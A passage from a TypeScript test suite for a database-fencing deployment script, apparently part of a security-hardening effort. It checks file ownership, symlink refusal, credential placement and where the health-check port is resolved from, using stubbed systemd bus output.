  assert.match(refusal, /\n  die "/, `and it must die rather than warn:\n${refusal}`)
})

test('no entrypoint executes the application-owned fence script from its own path', () => {
  // The rule stated once, over the source, so a mode added later cannot reintroduce it quietly:
  // update.sh runs the fence helper through a RESOLVED path — the root-owned copy — and never
  // through ${DB_FENCE_SCRIPT} directly. The other two entrypoints have no recovery record and no
  // protected copy at all, so they are excluded by name rather than by silence.
  //
  // MUTATION ROUTE: put `node "${DB_FENCE_SCRIPT}" --preflight` back in require_fenceable_database
  // and this test fails, printing that line.
  const direct = UPDATE_LINES.filter((line) => isCode(line) && /node "\$\{?DB_FENCE_SCRIPT\}?"/.test(line))
  assert.deepEqual(
    direct,
    [],
    'update.sh must never execute the application-owned fence script in place; resolve it through db_fence_script_in_use() first',
  )
  // PRECONDITION: it really does invoke the helper, so the assertion above is not vacuous.
  const resolved = UPDATE_LINES.filter((line) => isCode(line) && /node "\$\{(fence|preflight|dry|release)_script\}"/.test(line))
  assert.ok(resolved.length >= 4, `precondition: update.sh invokes the fence helper through a resolved path (${resolved.length})`)
})

test('the recovery record lives where the application user cannot rewrite it', () => {
  // WHY NOT IN THE FENCE MARKER, which is what Codex proposed and what the adoption already keys
  // on: ${CUTOVER_STATE_DIR} is the APPLICATION'S OWN DATA DIRECTORY and is writable by the
  // application user — update.sh says so itself, in the comment that moved the environment
  // snapshot out of it. Putting the identity there would hand the account this recovers FROM the
  // ability to aim the recovery re-fence at a database of its choosing.
  //
  // MUTATION ROUTE: point DB_FENCE_RECOVERY_DIR at "${CUTOVER_STATE_DIR}/recovery" and the first
  // assertion fails, naming the line.
  // THE TRUST ROOT IS A LITERAL IN THE LIBRARY (o3d-2sm1.5 r31), which is where all three
  // entrypoints now get it from, and no entrypoint may reassign it: a root chosen by a variable is
  // only as trustworthy as whatever can set that variable.
  const LIBRARY = readFileSync(join(process.cwd(), 'scripts/lib/db-fence-protected.sh'), 'utf8')
  const LIBRARY_LINES = LIBRARY.split(/\r?\n/)
  // o3d-secops r2: the declaration begins `readonly` now, and the readers below REQUIRE that word
  // rather than tolerating it — a `^DB_FENCE_` match would have gone on finding nothing and passing.
  const line = LIBRARY_LINES.find((candidate) => /^readonly DB_FENCE_RECOVERY_DIR=/.test(candidate))
  assert.ok(line !== undefined, 'the library must resolve a recovery directory, and declare it `readonly`')
  assert.match(line, /^readonly DB_FENCE_RECOVERY_DIR="\/etc\/[^$]*"$/, `it must be a literal outside the application's tree: ${line}`)
  assert.ok(!/CUTOVER_STATE_DIR|APP_DIR|DATA_DIR|\$\{IMS_/.test(line), `and not derived from anything the application can move: ${line}`)
  for (const [label, lines] of [['update.sh', UPDATE_LINES], ['deploy.sh', DEPLOY_LINES], ['install.sh', INSTALL_LINES]] as const) {
    const reassign = lines.filter(
      (candidate) =>
        isCode(candidate) &&
        /^\s*DB_FENCE_(RECOVERY_DIR|SCRIPT_COPY|IDENTITY_FILE|PROTECTED_APP_DIR|STAGED_APP_DIR|RETIRED_APP_DIR|ARTEFACT_FILE|MANIFEST_FILE|VENDOR_ROOTS)=/.test(candidate),
    )
    assert.deepEqual(reassign, [], `${label} must not redefine the protected-helper paths the library owns`)
  }
  // AND THE PROTECTED COPY IS LAID OUT LIKE THE APPLICATION IT CAME FROM. `pg` is resolved by
  // walking up from the importing module's own directory, so a copy published as a bare file
  // under /etc resolves node_modules from /etc and / and dies with ERR_MODULE_NOT_FOUND before it
  // can fence anything — which is what r30 published.
  //
  // MUTATION ROUTE: point DB_FENCE_SCRIPT_COPY back at "${DB_FENCE_RECOVERY_DIR}/fence-db-connections.mjs"
  // and the assertion below fails.
  const copyLine = LIBRARY_LINES.find((candidate) => /^readonly DB_FENCE_SCRIPT_COPY=/.test(candidate))
  assert.match(
    copyLine ?? '',
    /^readonly DB_FENCE_SCRIPT_COPY="\$\{DB_FENCE_PROTECTED_APP_DIR\}\/scripts\/fence-db-connections\.mjs"$/,
    `the protected copy must sit at <root>/scripts/, the layout node's module walk expects: ${copyLine}`,
  )
  // AND ITS IMPORTS ARE COPIED, NOT LINKED (o3d-2sm1.5 r32, Codex CRITICAL). r31 pointed
  // <mirror>/node_modules at the APPLICATION-OWNED checkout with `ln -sfn`, so `pg` and `dotenv`
  // — imported at module scope, before main() has a statement to run — were still bytes the
  // account being defended against chose, in every supposedly protected process. Nothing in the
  // library may create that link again.
  //
  // MUTATION ROUTE: add `ln -sfn "${app_modules}" "${DB_FENCE_PROTECTED_APP_DIR}/node_modules"`
  // back into _fence_stage_and_publish() and the first assertion fails by name.
  const libraryCode = LIBRARY_LINES.filter((candidate) => isCode(candidate)).join('\n')
  assert.ok(
    !/\bln -s/.test(libraryCode),
    'the protected artefact may contain no symlink the library creates: a symlink is followed by node and is not covered by the artefact digest',
  )
  assert.match(
    libraryCode,
    /cp -R --no-dereference -- "\$\{app_dir\}\/\$\{relative\}" "\$\{staged\}\/\$\{relative\}"/,
    'the dependency closure must be COPIED into the mirror, at the same relative paths',
  )
  // --no-dereference is load-bearing, not tidiness: it copies a symlink AS a symlink so that
  // _fence_tree_is_sealed() can refuse it by name. Following it would pull the target's bytes in
  // silently, which is an escape the digest would then bless.
  assert.match(
    libraryCode,
    /find "\$root" \\\( ! -type d -a ! -type f \\\) -print -quit/,
    'and anything in the published tree that is not a regular file or a directory must be refused',
  )

  // AND IT IS CREATED ROOT-OWNED. 0755 rather than the snapshot directory's 0700 because the
  // fence runs AS THE APPLICATION USER and has to read both files; neither holds a secret.
  const publish = shellFunction(UPDATE_LINES.join('\n'), 'publish_fence_recovery_record')
  assert.match(publish, /chown root:root "\$\{DB_FENCE_RECOVERY_DIR\}"/, 'the recovery directory must be root-owned')
  assert.match(publish, /chmod 755 "\$\{DB_FENCE_RECOVERY_DIR\}"/, 'and traversable by the account that runs the fence')
  // THE CREDENTIAL IS NOT IN IT. A record that carried DEPLOY_ADMIN_DATABASE_URL would be a
  // password in a world-readable file, and the whole point of the split is that the identity is
  // durable state and the credential is an invocation argument.
  assert.ok(
    !/DEPLOY_ADMIN_DATABASE_URL|DATABASE_URL=/.test(publish),
    `no credential may be written into the recovery record:\n${publish}`,
  )
})

test('every shape of an unreadable .env is refused at the gate, not during initialisation', () => {
  // The file can be replaced as well as removed, and `-f` was the only shape r27's line checked.
  // MUTATION ROUTE: delete any one `elif` branch from the APP_LAYOUT_REASON block and the matching
  // case below reports status 0 and PAST_THE_GATE — the run continues with a file it cannot read.
  const cases: ReadonlyArray<{ label: string; make: (dir: string) => void; says: RegExp }> = [
    { label: 'a directory where the file should be', make: (dir) => mkdirSync(join(dir, '.env')), says: /is not a regular file/ },
    { label: 'a dangling symlink', make: (dir) => symlinkSync(join(dir, 'nowhere'), join(dir, '.env')), says: /does not exist/ },
  ]
  for (const scenario of cases) {
    const dir = mkdtempSync(join(tmpdir(), 'ims-layout-shape-'))
    try {
      scenario.make(dir)
      // The prelude alone: this half of the claim is that INITIALISATION survives it.
      const prelude = runUpdatePrelude(dir, ['APP_LAYOUT_REASON', 'ENV_FILE_APP_PORT'])
      assert.equal(prelude.status, 0, `${scenario.label}: initialisation must not abort:\n${prelude.output}`)
      assert.match(prelude.output, /^APP_LAYOUT_REASON=.+$/m, `${scenario.label}: and it must record why:\n${prelude.output}`)
      assert.match(prelude.output, scenario.says, `${scenario.label}: naming the shape:\n${prelude.output}`)
    } finally {
      rmSync(dir, { recursive: true, force: true })
    }
  }

  // PRECONDITION, so the two above are not passing because the block records a reason for
  // everything: a healthy .env records NO reason at all.
  const good = mkdtempSync(join(tmpdir(), 'ims-layout-good-'))
  try {
    writeFileSync(join(good, '.env'), 'DATABASE_URL=postgresql://app:pw@127.0.0.1:5432/ims\n')
    const prelude = runUpdatePrelude(good, ['APP_LAYOUT_REASON'])
    assert.match(prelude.output, /^APP_LAYOUT_REASON=$/m, `a readable .env must record no reason:\n${prelude.output}`)
  } finally {
    rmSync(good, { recursive: true, force: true })
  }
})

test('a malformed APP_PORT in .env no longer aborts update.sh during initialisation', () => {
  // THE PLACEMENT FINDING (o3d-2sm1.5 r27, Codex HIGH). r26 made a malformed value fatal on the
  // line that read it — during top-level initialisation, before the EXIT trap is installed,
  // before the cutover lock is acquired and before an existing fence marker is adopted. On a
  // recovery run that abandons a fence this run is responsible for re-establishing, while
  // claiming "nothing has been stopped and nothing has been migrated".
  //
  // The refusal has not gone away; it has MOVED (see the gate tests below). What this proves is
  // that it is no longer in the part of the script that runs before any of that machinery exists.
  //
  // MUTATION ROUTE: put r26's `elif ! valid_tcp_port "${APP_PORT}"; then die …` back beside the
  // read and every case here exits non-zero again.
  for (const bad of ['0', '65536', '99999', 'not-a-port', '80 80', '-1', '3000/tcp', '3e3']) {
    const dir = mkdtempSync(join(tmpdir(), 'ims-appport-bad-'))
    try {
      writeFileSync(join(dir, '.env'), `DATABASE_URL=postgresql://app:pw@127.0.0.1:5432/ims\nAPP_PORT=${bad}\n`)
      const result = runUpdatePrelude(dir, ['ENV_FILE_APP_PORT'])
      assert.equal(result.status, 0, `APP_PORT=${bad} must not abort initialisation any more:\n${result.output}`)
      assert.ok(
        !/is not a TCP port/.test(result.output),
        `APP_PORT=${bad}: the refusal must not fire before the lock and the adoption:\n${result.output}`,
      )
    } finally {
      rmSync(dir, { recursive: true, force: true })
    }
  }
})

// ---------------------------------------------------------------------------
// WHERE THE POLLED PORT COMES FROM — unit_listen_port() and resolve_app_port() run for real
// against a stubbed bus (o3d-2sm1.5 r27, Codex HIGH).
//
// `busctl` is stubbed because the point is not whether busctl works; everything that DECIDES is
// the shipped code, including the three bus-rendering helpers it shares with the DATABASE_URL
// scan. The renderings below are the shape systemd actually prints — signature, element count,
// then the elements — which is the whole reason this reads the bus rather than `systemctl show`.
//
// VERIFIED AGAINST THIS HOST'S REAL UNITS as well, outside the test run: ims-stage-dev.service
// resolves to 3000 and ims-e2e-dev.service to 3002, each from its own ExecStart, each agreeing
// with its own Environment=PORT=, and neither of their .env files mentions APP_PORT at all.
// ---------------------------------------------------------------------------
function runPortResolution(options: {
  environment?: string
  environmentFiles?: string
  passEnvironment?: string
  unsetEnvironment?: string
  pamName?: string
  execStart?: string
  loadState?: string
  invocationPort?: string
  unit?: string
}): { status: number; output: string } {
  const source = UPDATE_LINES.join('\n')
  const environment = options.environment ?? 'as 0'
  // The four later composition sources unit_env_var_sole_source() asks about for the `directive`
  // layer. The DEFAULT is a unit that loads none of them, so `Environment=PORT=` really is the
  // last word on the port there — which is what makes the file case below a difference and not
  // the resolver simply refusing everything.
  const environmentFiles = options.environmentFiles ?? 'a(sb) 0'
  const passEnvironment = options.passEnvironment ?? 'as 0'
  const unsetEnvironment = options.unsetEnvironment ?? 'as 0'
  const pamName = options.pamName ?? 's ""'
  // One command that names no port — a real unit always has an ExecStart, and the question
  // these cases turn on is whether it carries a port option, not whether it exists.
  const execStart = options.execStart ?? 'a(sasbttttuii) 1 "/usr/bin/npm" 2 "npm" "start" false 0 0 0 0 0 0 0'
  const loadState = options.loadState ?? 's "loaded"'
  const program = [
    'set -uo pipefail',
    `SERVICE_UNIT='${options.unit ?? 'app.service'}'`,
    options.invocationPort === undefined ? 'unset IMS_APP_PORT || true' : `IMS_APP_PORT='${options.invocationPort}'`,
    'BUS_STRINGS=(); BUS_ENV_IGNORE_FLAGS=()',
    'UNIT_PORT=""; UNIT_PORT_SOURCE=""; UNIT_PORT_REASON=""',
    'APP_PORT=""; APP_PORT_SOURCE=""; APP_PORT_REASON=""',
    'ENV_VAR_SOURCE_REASON=""',
    // The environment-snapshot globals belong to the `file` layer; the `directive` layer never
    // reaches them, and `set -u` still wants them to exist.
    "DB_ENV_SNAPSHOT_FILE=/var/lib/one-two-inventory/deploy/db-identity.env",
    "DB_ENV_SNAPSHOT_DROPIN_NAME=zz-deploy-db-identity.conf",
    'DB_ENV_SNAPSHOT_PUBLISHED=false',
    'DB_IDENTITY_REQUIRE_SNAPSHOT=false',
    // The stub answers the three questions the shipped code asks, in systemd's own rendering.
    'busctl(){',
    '  case "$*" in',
    `    *LoadUnit*) printf '%s\\n' 'o "/org/freedesktop/systemd1/unit/app_2eservice"' ;;`,
    `    *Unit\\ LoadState*) printf '%s\\n' '${loadState}' ;;`,
    // EnvironmentFiles FIRST: `*Service\ Environment*` is a prefix of it, and a case arm that
    // answers the wrong property with the right-looking rendering is a stub that lies.
    `    *Service\\ EnvironmentFiles*) printf '%s\\n' '${environmentFiles}' ;;`,
    `    *Service\\ Environment*) printf '%s\\n' '${environment}' ;;`,
    `    *Service\\ ExecStart*) printf '%s\\n' '${execStart}' ;;`,
    `    *Service\\ PassEnvironment*) printf '%s\\n' '${passEnvironment}' ;;`,
    `    *Service\\ UnsetEnvironment*) printf '%s\\n' '${unsetEnvironment}' ;;`,
    `    *Service\\ PAMName*) printf '%s\\n' '${pamName}' ;;`,
    '    *) return 1 ;;',
    '  esac',
    '}',
    shellFunction(source, 'valid_tcp_port'),
    shellFunction(source, 'bus_read_strings'),
    shellFunction(source, 'bus_array_count'),
    shellFunction(source, 'bus_unit_property'),
    shellFunction(source, 'bus_element_names_variable'),
    shellFunction(source, 'bus_read_env_ignore_flags'),
    shellFunction(source, 'unit_env_var_sole_source'),
    shellFunction(source, 'unit_listen_port'),
    shellFunction(source, 'resolve_app_port'),
    'if resolve_app_port; then echo "PORT=${APP_PORT}"; echo "SOURCE=${APP_PORT_SOURCE}"; else echo "REFUSED=${APP_PORT_REASON}"; fi',
  ].join('\n')
  return runShell(`bash -s <<'IMS_PORT_RESOLVE_EOF'\n${program}\nIMS_PORT_RESOLVE_EOF`)
}

test('the polled port comes from the unit, by either of the two directives that pin it', () => {
  // MUTATION ROUTE: delete the ExecStart scan from unit_listen_port() and the first two cases
  // report REFUSED; delete the Environment= scan and the third does.
  const fromExecStart = runPortResolution({
    execStart: 'a(sasbttttuii) 1 "/usr/bin/npm" 6 "npm" "run" "start" "--" "--port" "8080" false 0 0 0 0 0 0 0',
  })
  assert.match(fromExecStart.output, /^PORT=8080$/m, `ExecStart's --port must decide it:\n${fromExecStart.output}`)
  assert.match(fromExecStart.output, /^SOURCE=app\.service's own ExecStart=$/m, 'and the run must say where it got it')

  const fromShortFlag = runPortResolution({
    execStart: 'a(sasbttttuii) 1 "/opt/app/node_modules/.bin/next" 3 "next" "-p" "8080" false 0 0 0 0 0 0 0',
  })
  assert.match(fromShortFlag.output, /^PORT=8080$/m, `install.sh writes 'next start -p <port>', so -p must be read too:\n${fromShortFlag.output}`)

  const fromEnvironment = runPortResolution({ environment: 'as 2 "NODE_ENV=production" "PORT=8080"' })
  assert.match(fromEnvironment.output, /^PORT=8080$/m, `Environment=PORT= must decide it when ExecStart names none:\n${fromEnvironment.output}`)
  assert.match(
    fromEnvironment.output,
    /^SOURCE=app\.service's own Environment=PORT=, which nothing composed after it can redefine$/m,
    'and say so — including that nothing composed later could have moved it',
  )

  // Both, agreeing — this host's real units are written this way.
  const both = runPortResolution({
    environment: 'as 1 "PORT=8080"',
    execStart: 'a(sasbttttuii) 1 "/usr/bin/npm" 5 "npm" "run" "dev" "--port" "8080" false 0 0 0 0 0 0 0',
  })
  assert.match(both.output, /^PORT=8080$/m, `a unit that pins the port twice, consistently, is not a problem:\n${both.output}`)
})

test('the polled port is refused rather than guessed at when the unit does not settle it', () => {
  // Each of these WAS an answer under r26: .env said a number, the number was well-formed, and
  // the script polled it. MUTATION ROUTE: give unit_listen_port() a `UNIT_PORT=3000` default on
  // any of these paths and the corresponding case reports PORT=3000 instead of REFUSED.
  const cases: ReadonlyArray<{ label: string; options: Parameters<typeof runPortResolution>[0]; says: RegExp }> = [
    { label: 'the unit pins no port at all', options: {}, says: /pins no port at all/ },
    { label: 'the unit declares no ExecStart', options: { execStart: 'a(sasbttttuii) 0' }, says: /declares no ExecStart= at all/ },
    {
      label: 'the two directives disagree',
      options: {
        environment: 'as 1 "PORT=3000"',
        execStart: 'a(sasbttttuii) 1 "/usr/bin/npm" 5 "npm" "run" "dev" "--port" "8080" false 0 0 0 0 0 0 0',
      },
      says: /pins its port twice and the two disagree/,
    },
    {
      label: 'ExecStart names two different ports',
      options: { execStart: 'a(sasbttttuii) 1 "/usr/bin/npm" 6 "npm" "-p" "3000" "--port" "8080" false 0 0 0 0 0 0 0' },
      says: /names two different ports/,
    },
    {
      label: "ExecStart's port option has no readable value",
      options: { execStart: 'a(sasbttttuii) 1 "/usr/bin/npm" 3 "npm" "start" "--port" false 0 0 0 0 0 0 0' },
      says: /is not a decimal TCP port/,
    },
    {
      label: 'Environment=PORT= is not a port',
      options: { environment: 'as 1 "PORT=not-a-port"' },
      says: /Environment=PORT=not-a-port, which is not a decimal TCP port/,
    },
    {
      label: 'the unit is not loaded',
      options: { loadState: 's "not-found"', environment: 'as 1 "PORT=8080"' },
      says: /rather than loaded/,
    },
    {
      label: 'systemd states more ExecStart commands than one',
      options: { execStart: 'a(sasbttttuii) 2 "/usr/bin/npm" 3 "npm" "start" "--port" false 0 0 0 0 0 0 0' },
      says: /declares 2 ExecStart= commands/,
    },
    {
      label: 'the element count and the rendering disagree',
      options: { environment: 'as 3 "PORT=8080"' },
      says: /is not being read the way systemd wrote it/,
    },
  ]
  for (const scenario of cases) {
    const result = runPortResolution(scenario.options)
    assert.match(result.output, /^REFUSED=/m, `${scenario.label}: this must be refused, not guessed at:\n${result.output}`)
    assert.match(result.output, scenario.says, `${scenario.label}: the refusal must say what is wrong:\n${result.output}`)
  }
})

test('an EnvironmentFile the unit loads can redefine PORT, so Environment=PORT= alone is refused', () => {
  // THE r28 FINDING (Codex HIGH). systemd applies EnvironmentFile= AFTER Environment=, and the
  // file the application service loads is written by the APPLICATION USER. r27 read
  // `Environment=PORT=` as authoritative anyway — in the same script that had already refused
  // every later composition source for DATABASE_URL, four hundred lines above.
  //
  // The rendering below is the shape systemd prints for THIS HOST's real units, checked
  // read-only: `a(sb) 1 "<path>" true`, an environment file loaded with a leading `-`.
  //
  // MUTATION ROUTE (verified by making the change locally and re-running): delete the
  // `unit_env_var_sole_source PORT directive` call from unit_listen_port() and this reports
  // PORT=3000 — the value the unit's directive states and NOT the one the file would supply.
  const viaFile = runPortResolution({
    environment: 'as 1 "PORT=3000"',
    environmentFiles: 'a(sb) 1 "/opt/app/.env" true',
  })
  assert.match(viaFile.output, /^REFUSED=/m, `a directive is not the composed environment:\n${viaFile.output}`)
  assert.match(viaFile.output, /pins its port only in Environment=PORT=3000/, 'and the refusal must name what it read')
  assert.match(viaFile.output, /also loads 1 environment file\(s\) \(\/opt\/app\/\.env\)/, 'and the source that could move it')
  assert.match(viaFile.output, /EnvironmentFile= AFTER Environment=/, 'and why that source wins')

  // THE CONTROL, so the refusal above is about the FILE and not about Environment= generally:
  // the same unit with no environment file resolves, and the same unit with the file back but a
  // literal ExecStart flag resolves too — which is what install.sh writes and what this host's
  // real units carry, so the fix changes no working deployment.
  const noFile = runPortResolution({ environment: 'as 1 "PORT=3000"' })
  assert.match(noFile.output, /^PORT=3000$/m, `Environment=PORT= still decides it when nothing is composed after it:\n${noFile.output}`)
  const pinnedInExecStart = runPortResolution({
    environment: 'as 1 "PORT=3000"',
    environmentFiles: 'a(sb) 1 "/opt/app/.env" true',
    execStart: 'a(sasbttttuii) 1 "/usr/bin/npm" 5 "npm" "run" "start" "--port" "3000" false 0 0 0 0 0 0 0',
  })
  assert.match(
    pinnedInExecStart.output,
    /^PORT=3000$/m,
    `an ExecStart flag is the one pin a later environment source cannot move:\n${pinnedInExecStart.output}`,
  )

  // AND THE OTHER THREE LATER SOURCES, which are the same doctrine and the same mechanism.
  for (const [label, options, says] of [
    ['a second environment file', { environmentFiles: 'a(sb) 2 "/opt/app/.env" true "/etc/other.env" false' }, /also loads 2 environment file\(s\)/],
    ['PassEnvironment=PORT', { passEnvironment: 'as 1 "PORT"' }, /lists PORT in PassEnvironment=/],
    ['UnsetEnvironment=PORT', { unsetEnvironment: 'as 1 "PORT"' }, /lists PORT in UnsetEnvironment=/],
    ['PAMName=', { pamName: 's "login"' }, /sets PAMName=login/],
  ] as ReadonlyArray<[string, Parameters<typeof runPortResolution>[0], RegExp]>) {
    const result = runPortResolution({ environment: 'as 1 "PORT=3000"', ...options })
    assert.match(result.output, /^REFUSED=/m, `${label} must be refused too:\n${result.output}`)
    assert.match(result.output, says, `${label}: the refusal must name it:\n${result.output}`)
  }
})

test('the environment-source doctrine is ONE mechanism, told which variable to ask about', () => {
  // The finding behind the finding: r27 wrote a second port reader beside a doctrine that
  // already answered the question, and applied that doctrine to exactly one variable. So the
  // scan is parameterised now, and the DATABASE_URL entry point is a wrapper over it.
  //
  // MUTATION ROUTE: give unit_listen_port() its own copy of the EnvironmentFiles= scan instead
  // of calling unit_env_var_sole_source() and the first assertion fails; hard-code
  // `DATABASE_URL` back into unit_env_var_sole_source() and the second does.
  const source = UPDATE_LINES.join('\n')
  const scan = shellFunction(source, 'unit_env_var_sole_source')
  assert.ok(
    /local variable="\$\{1:-\}" layer="\$\{2:-\}"/.test(scan),
    `the scan must take the variable and the layer as arguments:\n${scan.slice(0, 400)}`,
  )
  assert.ok(!/DATABASE_URL/.test(scan), 'and it must name no variable of its own')
  assert.ok(/bus_element_names_variable "\$element" "\$variable"/.test(scan), 'and match on the name it was given')

  // Both callers go through it, and there is no second copy of the question anywhere.
  assert.ok(
    /unit_env_var_sole_source DATABASE_URL file "\$@"/.test(shellFunction(source, 'env_file_is_sole_database_url_source')),
    'the DATABASE_URL entry point must be a wrapper over the one scan',
  )
  assert.ok(
    /unit_env_var_sole_source PORT directive/.test(shellFunction(source, 'unit_listen_port')),
    'and the port resolver must ask the same one',
  )
  const callers = UPDATE_LINES.filter((line) => isCode(line) && /bus_unit_property "\$object" Service EnvironmentFiles/.test(line))
  assert.equal(callers.length, 1, `EnvironmentFiles= must be read in exactly one place, found ${callers.length}`)

  // AND NOTHING ELSE IN THE THREE ENTRYPOINTS READS `Environment=` WITH THE OLD ASSUMPTION.
  // Every read of the property is either this scan or a copy of it; PORT was the one value taken
  // from a directive and believed, and it is the one fixed. MUTATION ROUTE: add
  // `bus_unit_property "$object" Service Environment` anywhere outside the scan in any of the
  // three and this names that script.
  for (const entry of R9_SCRIPTS) {
    const reads = entry.source
      .split(/\r?\n/)
      .filter((line) => isCode(line))
      .filter((line) => /Service Environment\b|systemctl show[^\n]*-p Environment\b/.test(line))
    assert.ok(reads.length <= 1, `${entry.name} reads Environment= in ${reads.length} places; the doctrine lives in one:\n${reads.join('\n')}`)
  }
})

test('the root invocation may state the port; the application-owned file may not', () => {
  // The ONE input that outranks the unit is the operator's, and it is the same standing
  // IMS_APP_DIR and IMS_SERVICE_UNIT already have. MUTATION ROUTE: delete the IMS_APP_PORT branch
  // from resolve_app_port() and the first case reports 3000 (the unit's) instead of 9999.
  const override = runPortResolution({ invocationPort: '9999', environment: 'as 1 "PORT=3000"' })
  assert.match(override.output, /^PORT=9999$/m, `the invocation must win:\n${override.output}`)
  assert.match(override.output, /^SOURCE=the IMS_APP_PORT deployment input/m, 'and the run must say the operator chose it')

  const badOverride = runPortResolution({ invocationPort: 'not-a-port', environment: 'as 1 "PORT=3000"' })
  assert.match(badOverride.output, /^REFUSED=IMS_APP_PORT was given on this run's invocation/m, `and it is validated, not trusted:\n${badOverride.output}`)

  // AND resolve_app_port() NEVER CONSULTS .env. Structural, because "it did not read the file" is
  // not something a stub can demonstrate: the function's own body is the whole claim.
  const body = shellFunction(UPDATE_LINES.join('\n'), 'resolve_app_port')
  assert.ok(!/env_file_value|ENV_FILE_APP_PORT|APP_DIR/.test(body), `resolve_app_port() must not reach for the application-owned file:\n${body}`)
  const unitBody = shellFunction(UPDATE_LINES.join('\n'), 'unit_listen_port')
  assert.ok(!/env_file_value|ENV_FILE_APP_PORT|APP_DIR/.test(unitBody), `unit_listen_port() must not reach for it either:\n${unitBody}`)
})

// ---------------------------------------------------------------------------
// THE PORT GATE: WHAT IT REFUSES, AND WHERE IT SITS (o3d-2sm1.5 r27, both Codex HIGHs).
// ---------------------------------------------------------------------------

/** The shipped gate, sliced out of the script and run with the reporting helpers stubbed. */
function runPortGate(options: { appPort: string; envFilePort: string; reason?: string }): { status: number; output: string } {
  const start = UPDATE_LINES.findIndex((line) => /^# THE PORT GATE —/.test(line))
  assert.notEqual(start, -1, 'the gate must still carry the heading this slice is cut at')
  const end = UPDATE_LINES.findIndex((line, index) => index > start && /^info "Health checks will poll port/.test(line))
  assert.notEqual(end, -1, 'and it must still end with the line that reports the port it settled on')
  const program = [
    'set -uo pipefail',
    'die(){ echo "DIE: $*"; exit 1; }',
    'info(){ echo "INFO: $*"; }',
    "SERVICE_UNIT=app.service; APP_DIR=/opt/app",
    `APP_PORT='${options.appPort}'`,
    `APP_PORT_SOURCE="app.service's own ExecStart="`,
    `APP_PORT_REASON='${options.reason ?? ''}'`,
    `ENV_FILE_APP_PORT='${options.envFilePort}'`,
    shellFunction(UPDATE_LINES.join('\n'), 'valid_tcp_port'),
    ...UPDATE_LINES.slice(start, end + 1),
  ].join('\n')
  return runShell(`bash -s <<'IMS_PORT_GATE_EOF'\n${program}\nIMS_PORT_GATE_EOF`)
}

test('the port gate refuses an .env that names a port the service does not listen on', () => {
  // THE FINDING, AS A CASE. A well-formed APP_PORT=3002 beside a service the unit starts on 3000
  // was, under r26, simply the port this script polled — where the full-chain e2e rig answers
  // /api/health and serves /_next/static/<BUILD_ID>/ out of a tree built from the same repo.
  //
  // MUTATION ROUTE: delete the mismatch `die` and this exits 0; make .env the source again
  // (APP_PORT="${ENV_FILE_APP_PORT}") and the INFO line reports 3002.
  const drifted = runPortGate({ appPort: '3000', envFilePort: '3002' })
  assert.notEqual(drifted.status, 0, `a file naming a different port must be refused:\n${drifted.output}`)
  assert.match(drifted.output, /says APP_PORT=3002 and app\.service listens on 3000/, 'and the refusal must name both')
  assert.match(drifted.output, /NOTHING NEW HAS BEEN STOPPED, FENCED OR MIGRATED BY THIS RUN/, 'and say what state the box is in')
  assert.match(drifted.output, /any fence a previous run left standing has just been adopted above/, 'including that the fence was adopted first')

  // Malformed is refused too, and by the SAME gate at the same safe point.
  const malformed = runPortGate({ appPort: '3000', envFilePort: 'not-a-port' })
  assert.notEqual(malformed.status, 0, `a malformed claim must still be refused:\n${malformed.output}`)
  assert.match(malformed.output, /is not a TCP port/, 'and say what is wrong')

  // Unresolvable is fatal on its own, whatever .env says.
  const unresolved = runPortGate({ appPort: '', envFilePort: '3000', reason: 'app.service pins no port at all' })
  assert.notEqual(unresolved.status, 0, `no port from the unit means no poll:\n${unresolved.output}`)
  assert.match(unresolved.output, /cannot establish which port app\.service listens on/, 'and say so')

  // POSITIVE CONTROL, so the refusals above are not a gate that can only ever refuse: agreement
  // passes, and so does a file that makes no claim at all.
  for (const agreeing of ['3000', '']) {
    const ok = runPortGate({ appPort: '3000', envFilePort: agreeing })
    assert.equal(ok.status, 0, `.env saying '${agreeing}' must pass:\n${ok.output}`)
    assert.match(ok.output, /^INFO: Health checks will poll port 3000, from app\.service's own ExecStart=/m, 'and the run must say where the port came from')
  }
})

test('nothing but resolve_app_port() may decide the port update.sh polls', () => {
  // THE HEADLINE FINDING, AS A STRUCTURAL INVARIANT. The gate tests below catch a .env that
  // DISAGREES with the unit; they cannot catch a change that makes .env the source again, because
  // then the two agree by construction and the gate is satisfied. What has to hold is narrower and
  // checkable: APP_PORT is written by resolve_app_port() and by nothing else, and no assignment to
  // it anywhere takes the value read out of the application-owned file.
  //
  // MUTATION ROUTE: add `APP_PORT="${ENV_FILE_APP_PORT:-3000}"` anywhere in update.sh — which is
  // r26's behaviour restored — and this fails naming that line.
  const source = UPDATE_LINES.join('\n')
  const resolver = shellFunction(source, 'resolve_app_port')
  const outside = source.split(resolver)
  assert.equal(outside.length, 2, 'precondition: resolve_app_port() was found exactly once')

  const assignments = outside
    .join('\n')
    .split(/\r?\n/)
    .filter(isCode)
    // shellCodeOnly, because two refusal messages QUOTE the name (`…says APP_PORT=…`) and a scan
    // that cannot tell a quoted mention from an assignment reports the message as one.
    .filter((line) => /(^|[\s;&|(])APP_PORT=/.test(shellCodeOnly(line)))
  assert.deepEqual(
    assignments.map((line) => line.trim()),
    ['APP_PORT=""'],
    `outside resolve_app_port() the only thing that may touch APP_PORT is its declaration:\n${assignments.join('\n')}`,
  )

  // And inside the resolver, the value comes from the invocation or from the unit — never the file.
  assert.deepEqual(
    resolver
      .split(/\r?\n/)
      .filter((line) => /^\s*APP_PORT=/.test(line))
      .map((line) => line.trim()),
    ['APP_PORT=""', 'APP_PORT="${IMS_APP_PORT}"', 'APP_PORT="${UNIT_PORT}"'],
    'resolve_app_port() must take the port from the invocation or from the unit, and from nothing else',
  )

  // PRECONDITION, so the enumeration above is not passing over a script that never uses the name:
  // the health URL and the listener probe are both built out of it.
  assert.match(source, /curl -fsS --max-time 5 "http:\/\/127\.0\.0\.1:\$\{APP_PORT\}\/api\/health"/, 'the health poll must use it')
  assert.match(source, /awk -v p=":\$\{APP_PORT\}\\\$"/, 'and so must the listener probe')
})

test('the port gate runs after an existing fence is adopted and before anything new is touched', () => {
  // THE SECOND HIGH. A refusal is only safe at a point where the refusal leaves the box
  // consistent. r26's ran during top-level initialisation — before the EXIT trap, before the
  // cutover lock and before the marker adoption — so a malformed value in an application-owned
  // file could make a RECOVERY run walk away from a fence it was responsible for re-establishing.
  //
  // MUTATION ROUTE: move the gate back above `acquire_cutover_lock` (or back beside the read) and
  // the first three assertions fail naming the line it moved to.
  const line = (pattern: RegExp) => {
    const index = UPDATE_LINES.findIndex((candidate) => isCode(candidate) && pattern.test(candidate))
    assert.notEqual(index, -1, `the script must still contain ${pattern}`)
    return index
  }
  const trap = line(/^trap on_exit EXIT$/)
